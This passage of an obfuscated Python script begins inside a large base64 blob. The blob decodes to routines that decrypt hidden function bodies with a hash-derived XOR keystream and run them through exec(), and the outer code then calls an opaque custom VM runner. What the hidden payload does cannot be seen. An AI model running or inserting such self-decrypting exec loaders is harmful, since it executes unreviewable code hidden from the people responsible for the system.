3ZEV5UzJhV1o0b2xUdWFacWtGK2tEZEhncGpYbVNjUnJpOHUwVG1Sa2xFc2ROdTk4dml2bGlJTWEwTGF2QjJSMHdpaldUeXJhYTlmbVk4WVY0c0tudXo0NGFGM1VNbXdaQ1JrYjJON1c0VUNiMzFSK080Z1lkRUhGTG1CUTF4dXU5UUgzcWQvbk9NSVRzMzE3anRQd3p1Y1gvQ253Z1hjcC9DTkJwS1J4dEt6VHpGaVlIKzR4R3MxM1ZtWEFNNGJveUdtUEdWek1lWmp5b1ZKVDBZQjNpc0VDUWxOSHJuRFlETXVIY0dKWG13eDg2YWQ4L0d4WWg2R1FKY3ZxdFhrZ20vUkYxN29sTktOS0FPbU0ySndwV3d3b0FTNjc4MEI1QjZVM25TVW5LVTRjSGl5RnJlN2VQRmJqNVVBQTlzZFVNZldlc3Fkd0tWbVZkbFhYeHNxKzd6QnBtM00xb2pEUnQvZ2hHdzhlVXpmV0JrTTNBelZTSS9zb3NoUXpDbk5UZFhabG13YU9mTGhVeTU1VGhVQm12NUlmR2tKMHd4aWg4aHZpZEZONitkelpIdlNCT1grNkhBUUt2aGFVb3dpU3lHb3lZUUFFN25ucm4rbXVxZkJ2c1ZudVB6STU2Nnp3eFJzNEQ3RGk4UXF1ZTRlYjhhQjcrbHVvWHQrWkVua0piOWZuZ0IzVDg4SzllYVdLQW9Qc2tiRjkvSHdnOEk5ZFVXTGhYU2JzdmJVdElBTWNac3FEVWlhd3hLcy9pcFROS1ExVVdWcm9VdGVCdHdVYUNTZmU5NHZqbkppNnVpN2tnNi9uRDFaVnAvYnB4bnVNbnFsZW1WS3JDLzNpdUdYQXkxdHNLTDNMbmJEZzR5YlRMbjREVXpTMGU3blBMRG9YMVJiemVNUmV1ZktOeGd6RW95dmwxV2ZrcGszRXFsUGRlQ0tlNXhkUW4xQ0hFa0xLYkpYaTRTZTcvc1RiWk5VenBQSGdxUHlRVy8zMVB1b0hsOU5zQTVodWNhRXZkZnhYc0wyQTZ4cWdSbVcyWkZhL1RSeWlkMXF4ZTdGd2hrblNwN3c5Y2c4WDN5NVBKeWJreTFadWNGQ1dWY2RDN3Z3L2V5ZjZpMWJ1OUZmNzhqU25LeFMvWDJ2bzVqdHo3c0lmMVVwUDcyWERaMi9pdSt5bWx6eFJRQ2JkaGdFWmRPZlo2eXdCczY2UGZiTWhUdUhoSTVuSm9kVXZ4STROZ2ZWcjh1VFFleU9PcTdpVGVzOTBwcEg5M3dXNWtmRlB3cG1qa252d29WRzlDMm5vUENTV3IxQ3Jjc2NxK3VIU3lpa1o5eWxzbUlFeXJybEJTZjlNdGE3WTE4NFVCdEtnMzBGdnpkRndwYmtsdTNDZktVVlYxQ2R1SjJvcTh0dVpVRnlLd29jOVI3WmQvZVV4eWlhUFAvRWNNV1F1TkY0NDNQeS9KTldMaGExRVdSU1hlUGtoV0JLZGJmMTdtazY5dlhSUXh4VWsyWGNyVXFOS2pMTzJhZnp2QlhrQ2M3TVZnY2d4b21TUVJ3RklTeFRjOXB4bStTNkdXS2pUeEc5N3grTmNHRStxa0pKSFNNSVcyNU9zOTRGN2RlbXBYd2pRTS9OcG9RYzFlRkZ6bjlOZEdaeDRSaXp1c0MwVmFaUmJTM3V0QjZBajE3YTV3d3dwVERxQlVqWnVwRUY4M3dQY2JFeStiTUQwUEhmM1AyM0tTUHFPN0Z4MktXWXc5VlVvRGJOMDNHbXZOTjFOQnVZUGczMW9Fa0tCTnFNdlJUNU1qdVdBNE14RFQ2V2thQnZFR2pMMHBtUC9nQkhzRlNPYitKSkNFMnlMUXFSVXJwVEkzRFh3R1lMTFhaNjNka0pkNjZoUU9FRnlhWTY4T3VwRWVoRUdGd1NTVU5vSkFjaE5ZZTE2ZWlCdVpvTGlJdzYraUhxTjB4N2FqelJJVEZndHg3SHJzZzNLaHdiRi9DUzlVZmJQa1ZDaHNkaDIwMDlUZUJNb1BZZlBMSWdiZ3BCOVNSK1pmVi81U1BxYS8wNWxLWnh2UlFWam4vZU4vdVBCWjNNWnltS3NZTFpLbzNVU3hhbDA4SGRLQW9JeUJWeFdRWUhha29CNTRFcDI1ZGNua2V5bDB1NnVLRjJwUVAzb25qcHBzVWkzS1IwN1M0cGdkQWVsNVF5alFkZFVUdFRkUFJTNkRXWENoYmxBblpxKzJoajdIcG5Za2wwQ1VuSlVTejk4VTFqTUJjSTQvUWdJUXVOOEtRcVRqY2R5bFhYdkJ5NDgyQnZWK0pUNCtJMGl4cWlMaVRyQzY4TEdXRWdXdlE5ZTlpQ1ptY1pKTHZOZjN2RFpHeUFlTGFrb2k2ekUzNGZUYmlOZTB5dkI4bi9hSE5FVUFUMTc4SktzZWtNZ0ZHU2RrdUFqaWJUSngvazJOeDRaait3NGJrSTVybWhHZTJUaDM4S1hhbjVMaWNvL2ZFU09VR0tJVGZ4WHB0bThyTC8zd2dCUXMzZmwrRGp1YWFVN2ZyVHcyajZna3FERjB0M0c5Ui9XYjlWdzlXRGpGTDg1czdaWlV6MHJHSXY4Sm1BK2htNllpZEZILzd5VWhGSHVONENONW1VdkduTVNJakhtZUI2WE1ZMVBTeGhRaWYvRE5hS0Q5a3FnOXRrQ0RIQ3ozMmF3T0I1TVJWTjZKWEw0c2RiKzljK1IwNEJyUkF3N3IxYU0ybndSck5Gc1hTdDFMOExrb0NkbDJhWHJac2k5clFLOHBJWGhidHZxSEFKUG03RTBYWVhOdkRmcjNjSEhyRnVRRVNWYWZmN2tHY1RTZGdoaDQveHVDd01BT3QvTGVCc1RNQ01Ca2wrSi93NDd0b3oxSTRablBlZlB6Z0pKZ2FEZkRBUTdEZlpFMUdqU2p2TmV6Mi91TENvN1NRNXBubHJyeEJkd1k3ckFyRnlBUHVRVXA2MzRzdUN0OWZWajkzTXhOS0QyZ0ZWUjlpOFhMWFpRQm5NRDFYTFU3MUR1dTRXVi9xQ0lHb1RkcFlaM0NFK3BmV1BvLzFETVE0c3JtRGdKQWNsZUw2MHBqeTNYdndYTnQ5WFN3TlBNZytMUENINDNBVWJuUUtVYkZXR1g3cjRiaGJpenkyWkp3bUpQUnhrcW01Z25PUkdSRnZQUUhqNUg4TkMvQ2kwVFBsNGFTZk9Vam12MVVVcEdBSGxPM2VjcHQ5Ri9yYmhERTVOK0M4d0h1ZHhHQzFySCtUeDlBU0JwRFRYZXp0TFl1L3JIN2MwM3lVc05STHBzYzh6WXJtMjc2WjZxd2ZiZ2RXWHF3V3lqRzNLMGZiZ1ZtM2pnN2xvMHRKSkFtUVpUcDFIS0x2UnNYbHlSMTRlekJBR0VNY201WlE0d3cxWjIvQVNJbStzak5ZMFdUZ1dXZTBFcHJVdnlTbUROdEtCNk5DR3hlR1NUTkFyQVc3dWtmS3pUdFdEM052TnlXZnlTK2FuUGNRSitzUGs5U1pXaXhPSkxsek5tc3RzNHUwVTN5U2NGbFBnZVhGUG96YkJ4Q2ErRld0WkpQYmEwclVUUlczVlQvVHcyaVc0RVE0VWVieCtESHlpeGtiaFpkL29KT1EwZFI2Y1lZUGdRdXdhMUF5Z0d4Q0I5VVNsVEtGVTJMY3QyTlQzYlVXdURSTzlCWEs4ay8zaTUvSFVwUVJCQWF1OTBYSitEWlh6dy9EczdsdmlVUHRldlp3QS9Cci9tL1U0Z1I2QnhoUDFsK0liYTV5eVllWVRTWGpKZHl1TjlVeHdKNGg5Q0tOa2RjRllwYjVlK0M0OE8wVDNJR1RyYm9SRjNyU1VTT2VDcitnZnpjc0xQVFhrc2RGeU80UDZyUHhucmFhOFlyREN1UzQ4aTg5RHpVWE9PdlN5Q0h2WDBmRlN6aWYxenIvSTBQUlJ5Znp5U3pJQWRKY243Ly82NjA2akpOTWNUWjRmKzhoR2NEUzdyc2l0ZkJFRHQ3dDVWUjJkRVBEUDZWelhFQXdWSXk5dmgyZWRVUVRiMXpneVpGVUpVbG5OQjc1akNhbUFEUnhDT1FwbGxlRzBzUmVvektGb1o4WWdUeW9lNHl1SXJ3TnZsd1NSY1ZlVEExNTVqdmZVSENtT0RBbWpFZ1hoTWpTMkdDUlAwczF1M0tBNThtb1JNUkNhRitjTVBaN0I2VzFWS2NMSGtMVkhPNjI2SzM0cnRUR3o1amhJMS9NdkpVSHJLcnk5N1BMbFFyUnRXZ2dpUW9rVG9qZ2hQLzBaM25kdnVNTlRDNTgrc2llSFk3dEUzekFvMTYyVFlCYUwvRWhKL1YrZWhhR3cxS09uY2pMMFlad3NxNExuT1g0azRpS3FnMERzYUtDcVpreERGcXkxeHEvNTlLTGFYNS9icHMyV1FmeDIyR1YraGVoaTNGeDNRVVZ4K1VCbkdISDBBVktNSllBZXVLbFUvdXNqSTRhZGErK1lma0FxVm51eDdLVTRNQVJtOEtJaXQxSmNiZmRyWUc1THlNTkhrN2pWTFRWaU9IRlJ6WVVXdG40VVl6T1RiV3ladXNsU3ltaUVUZ0tvclU3cTFqT3ZvekZ5c3pDazExZjNQWW10ditYeEFhSURuRm5TWVI0S2dMaFdORlltaGNnTVlYdzVMelNEdGZFcVdhK1FLYjlPaElGZzh3anFMVzZ0cjdmdlhvZ3EydTl2VkFVaC9qMzlFWlZZTk0ra0N0ZkVkakNXZU85L2lsOVZ6T3hzNjNIbFBjYlA2ZkFYbUVYbWpuZnk0N1VzNmdjOE5UdWp5czZudkNFZFNRS1MzV0x3OFViVTA1Y203UWRua0oxalc4b0FaZ08wckZHTXM4cFhSY2RUalRjd1dSczZ6OWsrT1FCVTM4c25FRjM2dkoyNlk0QmkwNXZvclEyWXpidTNKVGVxaFo0bHA5cXdqZjJ1dDFWZHhrdHU4M3l1R29saEtkZ0Z6dUpObGN2VnFiakdBRk80eDRHS1lOT00wWWQvRmxsQzNmcFV3ekUzeUtnYTkzSFVtaENpa0laTGhtcmM5dFRMUWFsUVZWRGJzQmxPT1l1RVBEVkhUUmZ1eTJRVTROMGlaVkQvS0NyRG9DenVIS2xmZ2FpMktDL1FvNjAydFg4Sm51eWFOaC9ZQ2NkSm9tdldrWmVVbmE2MFBVVGpiMVBxSE9WUURxdzRPWGErSzluM3gzbXBKK2p0N25kcWw2aTFhS3diLzNiYzB3aVV6Vys4aVpERTZaNGlRa2JITVhmTmtjUThaeUQ5Q0hUS0VzSDdEZTVXZG5VQ1R0ZDZpMWEzU0IyN1FmSDhwRUtncnVFeC8zcVhtR3puWjd0dHh0Vmc2SDd1T1dVdVNGS3pOdEhJWi9za1o1RmRhTXpBNUY4YXFGY1FEdnlCSi9zVzVkNTJYV0dWbW1ubjdxVnJGalg5cXZqalpJd0xlcjRuMDI2U0lReUJQaWxEdVlXam5GZC9mQ2J2Z1RLcUx0eEdWakRtSk8rNnJuNlVjeGQyVC9aUTBsMjd2YmN5TG5iSEs5WDhjeHZ4ZCtrYWxoTXRPZ1VWSzFKMGxBY1pqME1HVk9kbmJsNEozQnlja0dsMi9VSnRWczViTllYUkZpZXJGcktpTERWU25UYit4NXpEbnM4ZVRNV0RHSVhBRTliRERIREJjVWVyNEdBMG0wNTZnYkhXdzNVRUowcXpTd0ovUjNaeTVyeldVaFpSd2JJLy9RN2FKWnB4Zk8yK0xqVE4vYXRzMGk4L0VhMmFabEVUQUd6ajhoNU11MWRpMDZWTGxYam04eGc5NDhFNTczd282MkUrd3F0Y01CbWxta2pHM3psOUwzZEZuYSttTGRzRWVmWGwvZzRSU05ZWEtsdmo2QzJFM09qZnNCdW56SjZRNjVlK05oVjlYb3FBMmFoNXNqRXFNVlhEb0hMTDNuRnFmZTBUTmNFTUZPQ29TOEpBOHpwVGRZZFZvZEV5SWlpbkNhU0paN2s4N2FycVFxdDBRVlBzejU3bS9xNGYvaTZNNjNZek5oWGh3QTZ3cExvR0hrZXZGR2x3aS9sUzZaenFNaWEyU1YwcFZ1OHorV2tnQXFZeVNZdVpvWXdiTlRGYWhsWmFwZzR1cE5NdzQ4TG51Ulh3U09walNtWG1CNEwrU2Z2MENMWHBzWERiYmZTVnVhMktUaURlRjlseXhodmpGYVNLZXZ5VmthZkRmYloxTEFnUndIeVNOU0Y0WGJ6dEdzMGkwWDdnUVFCaW9jeXQvMlZLWjJjMnlCV0lVSnA2N2RuU0g5WEhHOGJmV3FhclcxM1dYb21OTHl2SHk3UWlLL0pZZjk2Mkg3Mng5YU1QT3lWL0pBOEhiL1lUcERoYVlEbC9aU0grUE5uQ2hGUGdZRjZwTFdOWU1CYnJ6T25XR0lBNUlXMlM3cUFDRGNCeCtPaWMxemxpMFA1Tkhzc1Y2dmZpdGp2V0RGUHJ4elJqSDBKYXV0Ty9JZ0FpWVdOUXZnenpUQ2tjRUVpMG9jb1RWV2ppcTZTOVVLZEVrQ2E0OXlvaCtYV0tZQSt5bktqb0lodE82cVp6WFJKc1hVRzljRmJ0WjRFZjlsdXhwM2ZtcVR1T2J1TCtXVTNaUWRvRmF4VGdWbFpRQlMyNmUzMVVQZWVWT3RQUE01RGNUbmo3eVpFbUhXRWR1dlA0R3VVMjFxYXA5SzA4M1BudDFDMDcxWThXYjQ0a2tEVGxwRlRTd0F1YzJFV2ExTkpJVTdoa2dkR3pHZWo4a3VUL25KbU10L3IrQjBBQk8rVlNoaXFteHZFOUhicGJVczZaK0FpWnRTS0lDWlJEWHhyelo1enJ6SW1zcUppSGZrNG5ZTlEwbFBhRDFIeDArazlsNEsyVGpnbXVSeG4vZksrSEFyVzNCWnF3OGdrVFVkTzJhT0JISHFBUU1xRlRidXZMZUVPbnZVTFdtZkthbStwc3l3b1ZtQTYyZWpUaGJtaXdJVTJTMCt2UFZrZk1Zd0hnVnl2ZkJqRVpmQUtGZk5NRkRwUEhQUURWUzdGZkdyWE12YkZUbVdNeWJBMUNLWThhd3N0Szl2bXBzMzIrWStDMU5sUFBTS2VtMGQzKzB4ZGlnWDUyZndQYW4zcnM1UGgxM1BUN1M5OXhVdnV5NmhHaFBWUmFDeHZ6VUJ2R1FtT3BNYWhKbHU0T2pjMXQvR2tPd0RGVnJ2QjhNclJDNHVPVTZucC9LYmUzMkNSYk4vcUxncXJpOHJWVSs2NFBBcEl4cmsxRjhNOU1vT3hpT0lTdUZ4M3I5eFlnc1J2Qm5ldGJIUWplbFBIVjUrenlicmZCbGNOYnVxSEc4Nks2UTlGa0Q2MWw4cUlkMmxHU3M2ZTJmZWpnL2Jyd2tlWVBHSFdyZFRPZnlRc241TXMvbHdnWS9IUk9XaDVrSEd5RjhTU1VhQnFpd0sxS2ZKTjVlMisxbGtLeDJSa0QwZ2NiMnB6dVFjVUljZXhGOFZJeENUQUZFd1cxV2ZNMHprTmtNa1I4TjdwNVF2S05qTjRJNUt2M3pOdXUzMElTcW45RHlLT0VlTmlvMm95M21xM2xmWFVLOC9DaG0za0NKcjR0VnBPcjg2VmFkMHR2MTFmYU93YmpKNEZzNXBnaGZ0cWZSK1JwRnNKR2ZVaTVkSmtmV3Rpc2pNbG16Q0o2cmxkbWFzY2hNcWNZR0RvRzRqbXJ2V1F4azdqeEdYRGprTjJqYmt3d2xIWXYvd052WWVYU016aG91WE5OekpXZE1JU0duc2UwbG9nVWFSaU5nK2NlNXJ3TlRZeVNkbkpxaDFWSjZlWDhKYkJ2SjcyckpVVDJ1SzZoUkNqRzA4dko1WEdkTGdXVUthNGtoVDhwdnBlOUlyQWdzbmxuM0FiYnk1SytkRlVhazhvdUt2MllRcWxMOHc4dDVWc255Q2V1RGEveGRNblBqQXVjUlUwZHNNRlllRU1lRGlxRlBQdWU4WkM1dy9oWm15bjljbzcwV1dtbmNEYlNtTzVwNjlib3hyaVdvY1pWT2xwNllPV0s3b0g1TlZhMFlWRXhEV0NTYTJTRXdEUlI1dlNjaE5oeTRCV1cyRkJkL1hiTzBwamd6TjdVTXFFTUZtTldmZGdZUTJ4S1VSODlxd3Jidjk1dk8vZ3RqZURZSmQ5dzM4eUplaDdXUmZzZVBGMHhaVTlOd3dCU3hhV1EySzBKcW9UTHE3UFBuL1dEMlpLdFhuMCtQcnl3aUF5OWN5R29hZ3UxRUVYUlFOUm1uWWJ3cGZVclE2UzdFZm8zYlA5Wm1sL3R6TFYnKV0KX0ZVTkNfQ0FDSEUgPSB7fQoKZGVmIF9leGVjX2VuYyhpZHgsIGtleSwgbmFtZSwgYXJncywga3dhcmdzKToKICAgIGlmIG5hbWUgaW4gX0ZVTkNfQ0FDSEU6CiAgICAgICAgcmV0dXJuIF9GVU5DX0NBQ0hFW25hbWVdKCphcmdzLCAqKmt3YXJncykKICAgIHJhdyA9IF9GRU5DX0RBVEFbaWR4XQogICAgbm9uY2UsIHRhZyA9IChyYXdbOjE2XSwgcmF3Wy0xNjpdKQogICAgY3QgPSByYXdbMTY6LTE2XQogICAgYXV0aF9rZXkgPSBoYXNobGliLnNoYTI1NihiJ2F1dGh2MTonICsga2V5ICsgbm9uY2UpLmRpZ2VzdCgpCiAgICBpZiBub3QgaG1hYy5jb21wYXJlX2RpZ2VzdChoYXNobGliLnNoYTI1NihhdXRoX2tleSArIGN0KS5kaWdlc3QoKVs6MTZdLCB0YWcpOgogICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcignW2Z1bmNlbmNdIGludGVncml0eSBjaGVjayBmYWlsZWQnKQogICAgZW5jX2tleSA9IGhhc2hsaWIuc2hhMjU2KGInZW5jdjE6JyArIGtleSArIG5vbmNlKS5kaWdlc3QoKQogICAgcGxhaW5fYnl0ZXMgPSBfeG9yX3N0cmVhbShlbmNfa2V5LCBjdCkKICAgIHBsYWluX3N0ciA9IHBsYWluX2J5dGVzLmRlY29kZSgndXRmLTgnKQogICAgbnMgPSB7fQogICAgZXhlYyhwbGFpbl9zdHIsIGdsb2JhbHMoKSwgbnMpCiAgICBmdW5jID0gbnNbJ19mJ10KICAgIF9GVU5DX0NBQ0hFW25hbWVdID0gZnVuYwogICAgcmVzdWx0ID0gZnVuYygqYXJncywgKiprd2FyZ3MpCiAgICByZXR1cm4gcmVzdWx0Cgphc3luYyBkZWYgX2V4ZWNfZW5jX2FzeW5jKGlkeCwga2V5LCBuYW1lLCBhcmdzLCBrd2FyZ3MpOgogICAgaWYgbmFtZSBpbiBfRlVOQ19DQUNIRToKICAgICAgICByZXR1cm4gYXdhaXQgX0ZVTkNfQ0FDSEVbbmFtZV0oKmFyZ3MsICoqa3dhcmdzKQogICAgcmF3ID0gX0ZFTkNfREFUQVtpZHhdCiAgICBub25jZSwgdGFnID0gKHJhd1s6MTZdLCByYXdbLTE2Ol0pCiAgICBjdCA9IHJhd1sxNjotMTZdCiAgICBhdXRoX2tleSA9IGhhc2hsaWIuc2hhMjU2KGInYXV0aHYxOicgKyBrZXkgKyBub25jZSkuZGlnZXN0KCkKICAgIGlmIG5vdCBobWFjLmNvbXBhcmVfZGlnZXN0KGhhc2hsaWIuc2hhMjU2KGF1dGhfa2V5ICsgY3QpLmRpZ2VzdCgpWzoxNl0sIHRhZyk6CiAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKCdbZnVuY2VuY10gaW50ZWdyaXR5IGNoZWNrIGZhaWxlZCcpCiAgICBlbmNfa2V5ID0gaGFzaGxpYi5zaGEyNTYoYidlbmN2MTonICsga2V5ICsgbm9uY2UpLmRpZ2VzdCgpCiAgICBwbGFpbl9ieXRlcyA9IF94b3Jfc3RyZWFtKGVuY19rZXksIGN0KQogICAgcGxhaW5fc3RyID0gcGxhaW5fYnl0ZXMuZGVjb2RlKCd1dGYtOCcpCiAgICBucyA9IHt9CiAgICBleGVjKHBsYWluX3N0ciwgZ2xvYmFscygpLCBucykKICAgIGZ1bmMgPSBuc1snX2YnXQogICAgX0ZVTkNfQ0FDSEVbbmFtZV0gPSBmdW5jCiAgICByZXN1bHQgPSBhd2FpdCBmdW5jKCphcmdzLCAqKmt3YXJncykKICAgIHJldHVybiByZXN1bHQKCmRlZiBfeG9yX3N0cmVhbShrZXksIGRhdGEpOgogICAgcmVzdWx0ID0gYnl0ZWFycmF5KCkKICAgIGNvdW50ZXIgPSAwCiAgICB3aGlsZSBsZW4ocmVzdWx0KSA8IGxlbihkYXRhKToKICAgICAgICBrcyA9IGhhc2hsaWIuc2hhMjU2KGtleSArIGNvdW50ZXIudG9fYnl0ZXMoOCwgJ2JpZycpKS5kaWdlc3QoKQogICAgICAgIGNodW5rID0gZGF0YVtsZW4ocmVzdWx0KTpsZW4ocmVzdWx0KSArIDMyXQogICAgICAgIGZvciBhLCBiIGluIHppcChjaHVuaywga3MpOgogICAgICAgICAgICByZXN1bHQuYXBwZW5kKGEgXiBiKQogICAgICAgIGNvdW50ZXIgKz0gMQogICAgcmV0dXJuIGJ5dGVzKHJlc3VsdCkKCmRlZiBfYigqYXJncywgKiprd2FyZ3MpOgogICAgcmV0dXJuIF9leGVjX2VuYygwLCBfRlVOQ19LRVksICdfYicsIGFyZ3MsIGt3YXJncykKCmRlZiBfZSgqYXJncywgKiprd2FyZ3MpOgogICAgcmV0dXJuIF9leGVjX2VuYygxLCBfRlVOQ19LRVksICdfZScsIGFyZ3MsIGt3YXJncykKCmRlZiBfZigqYXJncywgKiprd2FyZ3MpOgogICAgcmV0dXJuIF9leGVjX2VuYygyLCBfRlVOQ19LRVksICdfZicsIGFyZ3MsIGt3YXJncykKCmRlZiBfZygqYXJncywgKiprd2FyZ3MpOgogICAgcmV0dXJuIF9leGVjX2VuYygzLCBfRlVOQ19LRVksICdfZycsIGFyZ3MsIGt3YXJncyk="), '<exec>', 'exec'), globals())
    _vm_run(_c, _k, _m, globals(), locals(), _map, _ok, _ht, _pf)
if __name__ == '__main__':
    _aohpaypd()
